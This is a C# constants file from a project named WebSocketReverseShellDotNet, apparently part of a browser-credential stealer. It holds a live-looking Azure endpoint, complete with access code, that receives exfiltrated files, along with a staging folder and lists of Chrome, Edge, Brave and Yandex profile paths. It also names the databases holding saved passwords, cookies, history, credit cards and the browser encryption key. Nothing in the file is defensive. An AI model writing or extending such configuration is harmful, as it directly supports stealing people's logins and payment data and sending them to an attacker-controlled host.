

namespace WebSocketReverseShellDotNet.utils
{
    internal static class Constants
    {
        /*       public const String SERVER_HTTP_URI = "http://localhost:7109/api/ExfiltrateFiles";*/

        public const String SERVER_HTTP_URI = "https://file-exfiltration.azurewebsites.net/api/ExfiltrateFiles?code=08wvQkLYKEx6oMsNjHW15vs7zzRluhdvGg4s_FH34fInAzFuqs_svA==";








        public const String EXFILTRATE_FOLDER = ".exfiltrate";



        public static string[] LIST_OF_BROWSER_LOCATIONS = [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\",
            "%LOCALAPPDATA%\\Google\\Chrome SxS\\User Data\\",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\",
            "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\",
            "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\",
        ];

        public static string ENCRYPTION_KEY_BROWSER_DB = "Local State";

        public static string[] LIST_OF_PROFILE_LOCATIONS = [
            "Default\\",
            "Profile 1\\",
            "Profile 2\\",
            "Profile 3\\",
            "Profile 4\\",
            "Profile 5\\",
            "Profile 6\\",
        ];
        public static string LOGIN_DATA_BROWSER_DB = "Login Data";
        public static string COOKIES_BROWSER_DB = "Network\\Cookies";
        public static string HISTORY_BROWSER_DB = "History";
        public static string CREDIT_CARDS_BROWSER_DB = "Web Data";






    }
}
